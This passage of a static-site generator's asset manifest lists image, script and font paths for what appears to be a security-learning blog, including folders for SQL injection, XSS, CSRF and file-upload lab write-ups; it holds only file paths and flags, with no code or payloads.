:"img/sql/lesson1/5.png","modified":0,"renderable":0},{"_id":"source/img/sql/lesson1/6.png","path":"img/sql/lesson1/6.png","modified":0,"renderable":0},{"_id":"source/img/sql/lesson2/3.png","path":"img/sql/lesson2/3.png","modified":0,"renderable":0},{"_id":"source/img/sql/lesson2/8.png","path":"img/sql/lesson2/8.png","modified":0,"renderable":0},{"_id":"source/img/sql/phpcms/004.png","path":"img/sql/phpcms/004.png","modified":0,"renderable":0},{"_id":"source/img/sql/phpcms/005.png","path":"img/sql/phpcms/005.png","modified":0,"renderable":0},{"_id":"source/img/sql/phpcms/006.png","path":"img/sql/phpcms/006.png","modified":0,"renderable":0},{"_id":"source/img/sql/phpcms/008.png","path":"img/sql/phpcms/008.png","modified":0,"renderable":0},{"_id":"source/img/sql/phpcms/009.png","path":"img/sql/phpcms/009.png","modified":0,"renderable":0},{"_id":"source/img/sql/phpcms/011.png","path":"img/sql/phpcms/011.png","modified":0,"renderable":0},{"_id":"source/img/sql/phpcms/010.png","path":"img/sql/phpcms/010.png","modified":0,"renderable":0},{"_id":"source/img/sql/phpcms/013.png","path":"img/sql/phpcms/013.png","modified":0,"renderable":0},{"_id":"source/img/sql/phpcms/014.png","path":"img/sql/phpcms/014.png","modified":0,"renderable":0},{"_id":"source/img/sql/phpcms/015.png","path":"img/sql/phpcms/015.png","modified":0,"renderable":0},{"_id":"source/img/sql/phpcms/017.png","path":"img/sql/phpcms/017.png","modified":0,"renderable":0},{"_id":"source/img/sql/phpcms/018.png","path":"img/sql/phpcms/018.png","modified":0,"renderable":0},{"_id":"source/img/sql/phpcms/019.png","path":"img/sql/phpcms/019.png","modified":0,"renderable":0},{"_id":"source/img/sql/phpcms/020.png","path":"img/sql/phpcms/020.png","modified":0,"renderable":0},{"_id":"source/img/tcpdump/19.png","path":"img/tcpdump/19.png","modified":0,"renderable":0},{"_id":"source/img/tcpdump/2.png","path":"img/tcpdump/2.png","modified":0,"renderable":0},{"_id":"source/img/tcpdump/20.png","path":"img/tcpdump/20.png","modified":0,"renderable":0},{"_id":"source/img/tcpdump/8.png","path":"img/tcpdump/8.png","modified":0,"renderable":0},{"_id":"source/img/ubuntu/ScreenSharing/001.png","path":"img/ubuntu/ScreenSharing/001.png","modified":0,"renderable":0},{"_id":"source/img/ubuntu/ScreenSharing/002.png","path":"img/ubuntu/ScreenSharing/002.png","modified":0,"renderable":0},{"_id":"source/img/ubuntu/wechat-install/001.png","path":"img/ubuntu/wechat-install/001.png","modified":0,"renderable":0},{"_id":"source/img/ubuntu/wechat-install/002.png","path":"img/ubuntu/wechat-install/002.png","modified":0,"renderable":0},{"_id":"source/img/xss/prompt_ml/level0_001.png","path":"img/xss/prompt_ml/level0_001.png","modified":0,"renderable":0},{"_id":"source/img/xss/prompt_ml/level0_002.png","path":"img/xss/prompt_ml/level0_002.png","modified":0,"renderable":0},{"_id":"source/img/xss/prompt_ml/level0_003.png","path":"img/xss/prompt_ml/level0_003.png","modified":0,"renderable":0},{"_id":"source/img/xss/prompt_ml/level0_004.png","path":"img/xss/prompt_ml/level0_004.png","modified":0,"renderable":0},{"_id":"source/img/xss/prompt_ml/level0_005.png","path":"img/xss/prompt_ml/level0_005.png","modified":0,"renderable":0},{"_id":"source/img/xss/prompt_ml/level0_006.png","path":"img/xss/prompt_ml/level0_006.png","modified":0,"renderable":0},{"_id":"source/img/xss/prompt_ml/level1_001.png","path":"img/xss/prompt_ml/level1_001.png","modified":0,"renderable":0},{"_id":"source/img/xss/prompt_ml/level1_002.png","path":"img/xss/prompt_ml/level1_002.png","modified":0,"renderable":0},{"_id":"source/img/xss/prompt_ml/level1_003.png","path":"img/xss/prompt_ml/level1_003.png","modified":0,"renderable":0},{"_id":"source/img/xss/prompt_ml/level2_001.png","path":"img/xss/prompt_ml/level2_001.png","modified":0,"renderable":0},{"_id":"source/img/xss/prompt_ml/level2_002.png","path":"img/xss/prompt_ml/level2_002.png","modified":0,"renderable":0},{"_id":"source/img/xss/prompt_ml/level2_003.png","path":"img/xss/prompt_ml/level2_003.png","modified":0,"renderable":0},{"_id":"source/img/xss/prompt_ml/level3_001.png","path":"img/xss/prompt_ml/level3_001.png","modified":0,"renderable":0},{"_id":"source/img/xss/prompt_ml/level4_001.png","path":"img/xss/prompt_ml/level4_001.png","modified":0,"renderable":0},{"_id":"source/img/xss/prompt_ml/level5_001.png","path":"img/xss/prompt_ml/level5_001.png","modified":0,"renderable":0},{"_id":"source/img/xss/prompt_ml/level6_001.png","path":"img/xss/prompt_ml/level6_001.png","modified":0,"renderable":0},{"_id":"source/img/xss/prompt_ml/level6_002.png","path":"img/xss/prompt_ml/level6_002.png","modified":0,"renderable":0},{"_id":"source/img/xss/prompt_ml/level6_003.png","path":"img/xss/prompt_ml/level6_003.png","modified":0,"renderable":0},{"_id":"source/img/xss/prompt_ml/level7_002.png","path":"img/xss/prompt_ml/level7_002.png","modified":0,"renderable":0},{"_id":"source/img/xss/prompt_ml/level7_003.png","path":"img/xss/prompt_ml/level7_003.png","modified":0,"renderable":0},{"_id":"source/img/xss/prompt_ml/level7_004.png","path":"img/xss/prompt_ml/level7_004.png","modified":0,"renderable":0},{"_id":"source/img/xss/prompt_ml/level8_001.png","path":"img/xss/prompt_ml/level8_001.png","modified":0,"renderable":0},{"_id":"source/img/xss/prompt_ml/level7_005.png","path":"img/xss/prompt_ml/level7_005.png","modified":0,"renderable":0},{"_id":"source/img/xss/prompt_ml/level9_001.png","path":"img/xss/prompt_ml/level9_001.png","modified":0,"renderable":0},{"_id":"source/img/xss/prompt_ml/level8_002.png","path":"img/xss/prompt_ml/level8_002.png","modified":0,"renderable":0},{"_id":"source/img/xss/prompt_ml/level9_002.png","path":"img/xss/prompt_ml/level9_002.png","modified":0,"renderable":0},{"_id":"source/img/xss/prompt_ml/levelA_001.png","path":"img/xss/prompt_ml/levelA_001.png","modified":0,"renderable":0},{"_id":"source/img/xss/prompt_ml/levelB_001.png","path":"img/xss/prompt_ml/levelB_001.png","modified":0,"renderable":0},{"_id":"source/img/xss/prompt_ml/levelB_002.png","path":"img/xss/prompt_ml/levelB_002.png","modified":0,"renderable":0},{"_id":"source/img/xss/prompt_ml/levelB_003.png","path":"img/xss/prompt_ml/levelB_003.png","modified":0,"renderable":0},{"_id":"source/img/xss/prompt_ml/levelC_001.png","path":"img/xss/prompt_ml/levelC_001.png","modified":0,"renderable":0},{"_id":"source/img/xss/prompt_ml/levelD_001.png","path":"img/xss/prompt_ml/levelD_001.png","modified":0,"renderable":0},{"_id":"source/img/xss/prompt_ml/levelC_002.png","path":"img/xss/prompt_ml/levelC_002.png","modified":0,"renderable":0},{"_id":"source/img/xss/prompt_ml/levelD_002.png","path":"img/xss/prompt_ml/levelD_002.png","modified":0,"renderable":0},{"_id":"source/img/xss/prompt_ml/levelD_003.png","path":"img/xss/prompt_ml/levelD_003.png","modified":0,"renderable":0},{"_id":"source/img/xss/prompt_ml/levelE_002.png","path":"img/xss/prompt_ml/levelE_002.png","modified":0,"renderable":0},{"_id":"source/img/xss/prompt_ml/levelF_001.png","path":"img/xss/prompt_ml/levelF_001.png","modified":0,"renderable":0},{"_id":"source/img/xss/prompt_ml/levelF_002.png","path":"img/xss/prompt_ml/levelF_002.png","modified":0,"renderable":0},{"_id":"themes/next/source/js/src/algolia-search.js","path":"js/src/algolia-search.js","modified":0,"renderable":1},{"_id":"themes/next/source/js/src/affix.js","path":"js/src/affix.js","modified":0,"renderable":1},{"_id":"themes/next/source/js/src/bootstrap.js","path":"js/src/bootstrap.js","modified":0,"renderable":1},{"_id":"themes/next/source/js/src/exturl.js","path":"js/src/exturl.js","modified":0,"renderable":1},{"_id":"themes/next/source/js/src/js.cookie.js","path":"js/src/js.cookie.js","modified":0,"renderable":1},{"_id":"themes/next/source/js/src/post-details.js","path":"js/src/post-details.js","modified":0,"renderable":1},{"_id":"themes/next/source/js/src/scroll-cookie.js","path":"js/src/scroll-cookie.js","modified":0,"renderable":1},{"_id":"themes/next/source/js/src/scrollspy.js","path":"js/src/scrollspy.js","modified":0,"renderable":1},{"_id":"themes/next/source/js/src/utils.js","path":"js/src/utils.js","modified":0,"renderable":1},{"_id":"themes/next/source/lib/font-awesome/HELP-US-OUT.txt","path":"lib/font-awesome/HELP-US-OUT.txt","modified":0,"renderable":1},{"_id":"themes/next/source/lib/font-awesome/bower.json","path":"lib/font-awesome/bower.json","modified":0,"renderable":1},{"_id":"themes/next/source/lib/velocity/velocity.min.js","path":"lib/velocity/velocity.min.js","modified":0,"renderable":1},{"_id":"themes/next/source/lib/velocity/velocity.ui.js","path":"lib/velocity/velocity.ui.js","modified":0,"renderable":1},{"_id":"themes/next/source/lib/velocity/velocity.ui.min.js","path":"lib/velocity/velocity.ui.min.js","modified":0,"renderable":1},{"_id":"source/fonts/LinBiolinum_RBah.woff","path":"fonts/LinBiolinum_RBah.woff","modified":0,"renderable":0},{"_id":"source/fonts/LinBiolinum_RIah.woff","path":"fonts/LinBiolinum_RIah.woff","modified":0,"renderable":0},{"_id":"source/img/Web/20190509/0x01_2.png","path":"img/Web/20190509/0x01_2.png","modified":0,"renderable":0},{"_id":"source/img/Web/20190509/0x02_1_1.png","path":"img/Web/20190509/0x02_1_1.png","modified":0,"renderable":0},{"_id":"source/img/Web/20190509/0x02_1_2.png","path":"img/Web/20190509/0x02_1_2.png","modified":0,"renderable":0},{"_id":"source/img/Web/20190509/0x02_2_1.png","path":"img/Web/20190509/0x02_2_1.png","modified":0,"renderable":0},{"_id":"source/img/Web/20190509/0x02_2_2.png","path":"img/Web/20190509/0x02_2_2.png","modified":0,"renderable":0},{"_id":"source/img/Web/20190509/0x04_2.png","path":"img/Web/20190509/0x04_2.png","modified":0,"renderable":0},{"_id":"source/img/Web/20190509/0x05_1.png","path":"img/Web/20190509/0x05_1.png","modified":0,"renderable":0},{"_id":"source/img/Web/20190509/0x05_3.png","path":"img/Web/20190509/0x05_3.png","modified":0,"renderable":0},{"_id":"source/img/Web/20190509/0x06_2.png","path":"img/Web/20190509/0x06_2.png","modified":0,"renderable":0},{"_id":"source/img/csrf/dvwa/high_001.png","path":"img/csrf/dvwa/high_001.png","modified":0,"renderable":0},{"_id":"source/img/cmd/2.png","path":"img/cmd/2.png","modified":0,"renderable":0},{"_id":"source/img/csrf/dvwa/high_004.png","path":"img/csrf/dvwa/high_004.png","modified":0,"renderable":0},{"_id":"source/img/csrf/dvwa/im_001.png","path":"img/csrf/dvwa/im_001.png","modified":0,"renderable":0},{"_id":"source/img/csrf/dvwa/medium_002.png","path":"img/csrf/dvwa/medium_002.png","modified":0,"renderable":0},{"_id":"source/img/csrf/dvwa/medium_003.png","path":"img/csrf/dvwa/medium_003.png","modified":0,"renderable":0},{"_id":"source/img/dedecms/dedecms查找后台目录/003.png","path":"img/dedecms/dedecms查找后台目录/003.png","modified":0,"renderable":0},{"_id":"source/img/fileupload/upload-labs/001_2.png","path":"img/fileupload/upload-labs/001_2.png","modified":0,"renderable":0},{"_id":"source/img/fileupload/upload-labs/002.png","path":"img/fileupload/upload-labs/002.png","modified":0,"renderable":0},{"_id":"source/img/fileupload/upload-labs/003_1.png","path":"img/fileupload/upload-labs/003_1.png","modified":0,"renderable":0},{"_id":"source/img/fileupload/upload-labs/004_1.png","path":"img/fileupload/upload-labs/004_1.png","modified":0,"renderable":0},{"_id":"source/img/fileupload/upload-labs/004_2.png","path":"img/fileupload/upload-labs/004_2.png","modified":0,"renderable":0},{"_id":"source/img/fileupload/upload-labs/004_3.png","path":"img/fileupload/upload-labs/004_3.png","modified":0,"renderable":0},{"_id":"source/img/fileupload/upload-labs/004_4.png","path":"img/fileupload/upload-labs/004_4.png","modified":0,"renderable":0},{"_id":"source/img/fileupload/upload-labs/006_1.png","path":"img/fileupload/upload-labs/006_1.png","modified":0,"renderable":0},{"_id":"source/img/fileupload/upload-labs/007_2.png","path":"img/fileupload/upload-labs/007_2.png","modified":0,"renderable":0},{"_id":"source/img/fileupload/upload-labs/007_4.png","path":"img/fileupload/upload-labs/007_4.png","modified":0,"renderable":0},{"_id":"source/img/fileupload/upload-labs/008_1.png","path":"img/fileupload/upload-labs/008_1.png","modified":0,"renderable":0},{"_id":"source/img/fileupload/upload-labs/008_2.png","path":"img/fileupload/upload-labs/008_2.png","modified":0,"renderable":0},{"_id":"source/img/fileupload/upload-labs/009_1.png","path":"img/fileupload/upload-labs/009_1.png","modified":0,"renderable":0},{"_id":"source/img/fileupload/upload-labs/010_1.png","path":"img/fileupload/upload-labs/010_1.png","modified":0,"renderable":0},{"_id":"source/img/fileupload/upload-labs/011_1.png","path":"img/fileupload/upload-labs/011_1.png","modified":0,"renderable":0},{"_id":"source/img/fileupload/upload-labs/011_4.png","path":"img/fileupload/upload-labs/011_4.png","modified":0,"renderable":0},{"_id":"source/img/fileupload/upload-labs/012_1.png","path":"img/fileupload/upload-labs/012_1.png","modified":0,"renderable":0},{"_id":"source/img/fileupload/upload-labs/012_2.png","path":"img/fileupload/upload-labs/012_2.png","modified":0,"renderable":0},{"_id":"source/img/fileupload/upload-labs/012_5.png","path":"img/fileupload/upload-labs/012_5.png","modified":0,"renderable":0},{"_id":"source/img/fileupload/upload-labs/012_6.png","path":"img/fileupload/upload-labs/012_6.png","modified":0,"renderable":0},{"_id":"source/img/fileupload/upload-labs/014_1.png","path":"img/fileupload/upload-labs/014_1.png","modified":0,"renderable":0},{"_id":"source/img/fileupload/upload-labs/014_4.png","path":"img/fileupload/upload-labs/014_4.png","modified":0,"renderable":0},{"_id":"source/img/fileupload/upload-labs/015_1.png","path":"img/fileupload/upload-labs/015_1.png","modified":0,"renderable":0},{"_id":"source/img/fileupload/upload-labs/015_2.png","path":"img/fileupload/upload-labs/015_2.png","modified":0,"renderable":0},{"_id":"source/img/fileupload/upload-labs/015_3.png","path":"img/fileupload/upload-labs/015_3.png","modified":0,"renderable":0},{"_id":"source/img/fileupload/upload-labs/016_3.png","path":"img/fileupload/upload-labs/016_3.png","modified":0,"renderable":0},{"_id":"source/img/fileupload/upload-labs/016_7.png","path":"img/fileupload/upload-labs/016_7.png","modified":0,"renderable":0},{"_id":"source/img/fileupload/upload-labs/018_2.png","path":"img/fileupload/upload-labs/018_2.png","modified":0,"renderable":0},{"_id":"source/img/fileupload/upload-labs/018_3.png","path":"img/fileupload/upload-labs/018_3.png","modified":0,"renderable":0},{"_id":"source/img/fileupload/upload-labs/019_2.png","path":"img/fileupload/upload-labs/019_2.png","modified":0,"renderable":0},{"_id":"source/img/knowledge/web/001.jpg","path":"img/knowledge/web/001.jpg","modified":0,"renderable":0},{"_id":"source/img/knowledge/Middleware_Parsing_vulnerability/002_2.png","path":"img/knowledge/Middleware_Parsing_vulnerability/002_2.png","modified":0,"renderable":0},{"_id":"source/img/knowledge/Middleware_Parsing_vulnerability/002_3.png","path":"img/knowledge/Middleware_Parsing_vulnerability/002_3.png","modified":0,"renderable":0},{"_id":"source/img/knowledge/Middleware_Parsing_vulnerability/002_4.png","path":"img/knowledge/Middleware_Parsing_vulnerability/002_4.png","modified":0,"renderable":0},{"_id":"source/img/knowledge/Middleware_Parsing_vulnerability/003_1.png","path":"img/knowledge/Middleware_Parsing_vulnerability/003_1.png","modified":0,"renderable":0},{"_id":"source/img/knowledge/Middleware_Parsing_vulnerability/003_4.png","path":"img/knowledge/Middleware_Parsing_vulnerability/003_4.png","modified":0,"renderable":0},{"_id":"source/img/knowledge/Middleware_Parsing_vulnerability/004_4.png","path":"img/knowledge/Middleware_Parsing_vulnerability/004_4.png","modified":0,"renderable":0},{"_id":"source/img/python/Reg/001.png","path":"img/python/Reg/001.png","modified":0,"renderable":0},{"_id":"source/img/python/Reg/002.png","path":"img/python/Reg/002.png","modified":0,"renderable":0},{"_id":"source/img/python/Reg/010.png","path":"img/python/Reg/010.png","modified":0,"renderable":0},{"_id":"source/img/seafile/001.png","path":"img/seafile/001.png","modified":0,"renderable":0},{"_id":"source/img/seafile/012.png","path":"img/seafile/012.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-11/1.png","path":"img/sql/Lesson-11/1.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-11/17.png","path":"img/sql/Lesson-11/17.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-11/15.png","path":"img/sql/Lesson-11/15.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-11/18.png","path":"img/sql/Lesson-11/18.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-11/20.png","path":"img/sql/Lesson-11/20.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-13/1.png","path":"img/sql/Lesson-13/1.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-13/11.png","path":"img/sql/Lesson-13/11.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-17/15.png","path":"img/sql/Lesson-17/15.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-17/17.png","path":"img/sql/Lesson-17/17.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-17/21.png","path":"img/sql/Lesson-17/21.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-17/23.png","path":"img/sql/Lesson-17/23.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-17/6.png","path":"img/sql/Lesson-17/6.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-18/11.png","path":"img/sql/Lesson-18/11.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-19/7.png","path":"img/sql/Lesson-19/7.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-19/8.png","path":"img/sql/Lesson-19/8.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-20/14.png","path":"img/sql/Lesson-20/14.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-24/001.png","path":"img/sql/Lesson-24/001.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-25/006.png","path":"img/sql/Lesson-25/006.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-34/005.png","path":"img/sql/Lesson-34/005.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-36/003.png","path":"img/sql/Lesson-36/003.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-43/010.png","path":"img/sql/Lesson-43/010.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-45/006.png","path":"img/sql/Lesson-45/006.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-46/004.png","path":"img/sql/Lesson-46/004.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-62/003.png","path":"img/sql/Lesson-62/003.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-62/004.png","path":"img/sql/Lesson-62/004.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-63/002.png","path":"img/sql/Lesson-63/002.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-64/002.png","path":"img/sql/Lesson-64/002.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-65/002.png","path":"img/sql/Lesson-65/002.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-8/20.png","path":"img/sql/Lesson-8/20.png","modified":0,"renderable":0},{"_id":"source/img/sql/lesson-5/13.png","path":"img/sql/lesson-5/13.png","modified":0,"renderable":0},{"_id":"source/img/sql/lesson1/1.PNG","path":"img/sql/lesson1/1.PNG","modified":0,"renderable":0},{"_id":"source/img/sql/lesson1/10.png","path":"img/sql/lesson1/10.png","modified":0,"renderable":0},{"_id":"source/img/sql/lesson1/11.png","path":"img/sql/lesson1/11.png","modified":0,"renderable":0},{"_id":"source/img/sql/lesson1/13.png","path":"img/sql/lesson1/13.png","modified":0,"renderable":0},{"_id":"source/img/sql/lesson1/14.png","path":"img/sql/lesson1/14.png","modified":0,"renderable":0},{"_id":"source/img/sql/lesson1/15.png","path":"img/sql/lesson1/15.png","modified":0,"renderable":0},{"_id":"source/img/sql/lesson1/16.png","path":"img/sql/lesson1/16.png","modified":0,"renderable":0},{"_id":"source/img/sql/lesson1/2.png","path":"img/sql/lesson1/2.png","modified":0,"renderable":0},{"_id":"source/img/sql/lesson1/25.png","path":"img/sql/lesson1/25.png","modified":0,"renderable":0},{"_id":"source/img/sql/lesson1/3.png","path":"img/sql/lesson1/3.png","modified":0,"renderable":0},{"_id":"source/img/sql/lesson1/4.png","path":"img/sql/lesson1/4.png","modified":0,"renderable":0},{"_id":"source/img/sql/lesson1/7.png","path":"img/sql/lesson1/7.png","modified":0,"renderable":0},{"_id":"source/img/sql/lesson1/8.png","path":"img/sql/lesson1/8.png","modified":0,"renderable":0},{"_id":"source/img/sql/lesson1/9.png","path":"img/sql/lesson1/9.png","modified":0,"renderable":0},{"_id":"source/img/sql/lesson2/9.png","path":"img/sql/lesson2/9.png","modified":0,"renderable":0},{"_id":"source/img/sql/phpcms/001.png","path":"img/sql/phpcms/001.png","modified":0,"renderable":0},{"_id":"source/img/sql/phpcms/003.png","path":"img/sql/phpcms/003.png","modified":0,"renderable":0},{"_id":"source/img/sql/phpcms/002.png","path":"img/sql/phpcms/002.png","modified":0,"renderable":0},{"_id":"source/img/sql/phpcms/007.png","path":"img/sql/phpcms/007.png","modified":0,"renderable":0},{"_id":"source/img/sql/phpcms/012.png","path":"img/sql/phpcms/012.png","modified":0,"renderable":0},{"_id":"source/img/sql/phpcms/016.png","path":"img/sql/phpcms/016.png","modified":0,"renderable":0},{"_id":"source/img/tcpdump/10.png","path":"img/tcpdump/10.png","modified":0,"renderable":0},{"_id":"source/img/tcpdump/12.png","path":"img/tcpdump/12.png","modified":0,"renderable":0},{"_id":"source/img/tcpdump/16.png","path":"img/tcpdump/16.png","modified":0,"renderable":0},{"_id":"source/img/tcpdump/17.png","path":"img/tcpdump/17.png","modified":0,"renderable":0},{"_id":"source/img/tcpdump/18.png","path":"img/tcpdump/18.png","modified":0,"renderable":0},{"_id":"source/img/tcpdump/21.png","path":"img/tcpdump/21.png","modified":0,"renderable":0},{"_id":"source/img/tcpdump/6.png","path":"img/tcpdump/6.png","modified":0,"renderable":0},{"_id":"source/img/xss/prompt_ml/level7_001.png","path":"img/xss/prompt_ml/level7_001.png","modified":0,"renderable":0},{"_id":"source/img/xss/prompt_ml/levelE_001.png","path":"img/xss/prompt_ml/levelE_001.png","modified":0,"renderable":0},{"_id":"themes/next/source/js/src/motion.js","path":"js/src/motion.js","modified":0,"renderable":1},{"_id":"themes/next/source/lib/jquery/index.js","path":"lib/jquery/index.js","modified":0,"renderable":1},{"_id":"source/img/cms/MetInfo/Getshell/7.png","path":"img/cms/MetInfo/Getshell/7.png","modified":0,"renderable":0},{"_id":"source/img/fileupload/upload-labs/003_2.png","path":"img/fileupload/upload-labs/003_2.png","modified":0,"renderable":0},{"_id":"source/img/fileupload/upload-labs/004.png","path":"img/fileupload/upload-labs/004.png","modified":0,"renderable":0},{"_id":"source/img/fileupload/upload-labs/005_1.png","path":"img/fileupload/upload-labs/005_1.png","modified":0,"renderable":0},{"_id":"source/img/fileupload/upload-labs/008_3.png","path":"img/fileupload/upload-labs/008_3.png","modified":0,"renderable":0},{"_id":"source/img/fileupload/upload-labs/019_1.png","path":"img/fileupload/upload-labs/019_1.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-11/13.png","path":"img/sql/Lesson-11/13.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-11/14.png","path":"img/sql/Lesson-11/14.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-15/2.png","path":"img/sql/Lesson-15/2.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-16/2.png","path":"img/sql/Lesson-16/2.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-17/19.png","path":"img/sql/Lesson-17/19.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-17/22.png","path":"img/sql/Lesson-17/22.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-17/8.png","path":"img/sql/Lesson-17/8.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-18/1.png","path":"img/sql/Lesson-18/1.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-18/6.png","path":"img/sql/Lesson-18/6.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-19/1.png","path":"img/sql/Lesson-19/1.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-20/5.png","path":"img/sql/Lesson-20/5.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-23/006.png","path":"img/sql/Lesson-23/006.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-37/001.png","path":"img/sql/Lesson-37/001.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-42/002_2.png","path":"img/sql/Lesson-42/002_2.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-42/004.png","path":"img/sql/Lesson-42/004.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-42/009.png","path":"img/sql/Lesson-42/009.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-42/010.png","path":"img/sql/Lesson-42/010.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-44/002.png","path":"img/sql/Lesson-44/002.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-44/003.png","path":"img/sql/Lesson-44/003.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-44/005.png","path":"img/sql/Lesson-44/005.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-44/006.png","path":"img/sql/Lesson-44/006.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-44/010.png","path":"img/sql/Lesson-44/010.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-45/001.png","path":"img/sql/Lesson-45/001.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-45/003.png","path":"img/sql/Lesson-45/003.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-46/001.png","path":"img/sql/Lesson-46/001.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-63/003.png","path":"img/sql/Lesson-63/003.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-64/003.png","path":"img/sql/Lesson-64/003.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-65/003.png","path":"img/sql/Lesson-65/003.png","modified":0,"renderable":0},{"_id":"source/img/sql/lesson-5/1.png","path":"img/sql/lesson-5/1.png","modified":0,"renderable":0},{"_id":"source/img/sql/lesson1/17.png","path":"img/sql/lesson1/17.png","modified":0,"renderable":0},{"_id":"source/img/sql/lesson1/18.png","path":"img/sql/lesson1/18.png","modified":0,"renderable":0},{"_id":"source/img/sql/phpcms/021.png","path":"img/sql/phpcms/021.png","modified":0,"renderable":0},{"_id":"source/img/sql/phpcms/022.png","path":"img/sql/phpcms/022.png","modified":0,"renderable":0},{"_id":"source/img/tcpdump/3.png","path":"img/tcpdump/3.png","modified":0,"renderable":0},{"_id":"source/img/xss/dvwa/Dom/high_001.png","path":"img/xss/dvwa/Dom/high_001.png","modified":0,"renderable":0},{"_id":"source/img/xss/dvwa/Dom/high_003.png","path":"img/xss/dvwa/Dom/high_003.png","modified":0,"renderable":0},{"_id":"source/img/xss/dvwa/Dom/impossible_01.png","path":"img/xss/dvwa/Dom/impossible_01.png","modified":0,"renderable":0},{"_id":"source/img/xss/dvwa/Dom/low_001.png","path":"img/xss/dvwa/Dom/low_001.png","modified":0,"renderable":0},{"_id":"source/img/xss/dvwa/Dom/low_003.png","path":"img/xss/dvwa/Dom/low_003.png","modified":0,"renderable":0},{"_id":"source/img/xss/dvwa/Dom/low_005.png","path":"img/xss/dvwa/Dom/low_005.png","modified":0,"renderable":0},{"_id":"source/img/xss/dvwa/Dom/medium_003.png","path":"img/xss/dvwa/Dom/medium_003.png","modified":0,"renderable":0},{"_id":"source/img/xss/dvwa/Dom/medium_005.png","path":"img/xss/dvwa/Dom/medium_005.png","modified":0,"renderable":0},{"_id":"source/img/xss/dvwa/Reflected/high_002.png","path":"img/xss/dvwa/Reflected/high_002.png","modified":0,"renderable":0},{"_id":"source/img/xss/dvwa/Reflected/high_003.png","path":"img/xss/dvwa/Reflected/high_003.png","modified":0,"renderable":0},{"_id":"source/img/xss/dvwa/Reflected/impossible_001.png","path":"img/xss/dvwa/Reflected/impossible_001.png","modified":0,"renderable":0},{"_id":"source/img/xss/dvwa/Reflected/low_002.png","path":"img/xss/dvwa/Reflected/low_002.png","modified":0,"renderable":0},{"_id":"source/img/xss/dvwa/Reflected/low_003.png","path":"img/xss/dvwa/Reflected/low_003.png","modified":0,"renderable":0},{"_id":"source/img/xss/dvwa/Reflected/medium_001.png","path":"img/xss/dvwa/Reflected/medium_001.png","modified":0,"renderable":0},{"_id":"source/img/xss/dvwa/Reflected/medium_t001.png","path":"img/xss/dvwa/Reflected/medium_t001.png","modified":0,"renderable":0},{"_id":"source/img/xss/dvwa/Reflected/medium_t002.png","path":"img/xss/dvwa/Reflected/medium_t002.png","modified":0,"renderable":0},{"_id":"source/img/xss/dvwa/Reflected/medium_t002_1.png","path":"img/xss/dvwa/Reflected/medium_t002_1.png","modified":0,"renderable":0},{"_id":"source/img/xss/dvwa/Reflected/medium_t003.png","path":"img/xss/dvwa/Reflected/medium_t003.png","modified":0,"renderable":0},{"_id":"source/img/xss/haozi/000.png","path":"img/xss/haozi/000.png","modified":0,"renderable":0},{"_id":"source/img/xss/dvwa/Stored/high_002.png","path":"img/xss/dvwa/Stored/high_002.png","modified":0,"renderable":0},{"_id":"source/img/xss/dvwa/Stored/high_003.png","path":"img/xss/dvwa/Stored/high_003.png","modified":0,"renderable":0},{"_id":"source/img/xss/dvwa/Stored/low_003.png","path":"img/xss/dvwa/Stored/low_003.png","modified":0,"renderable":0},{"_id":"source/img/xss/dvwa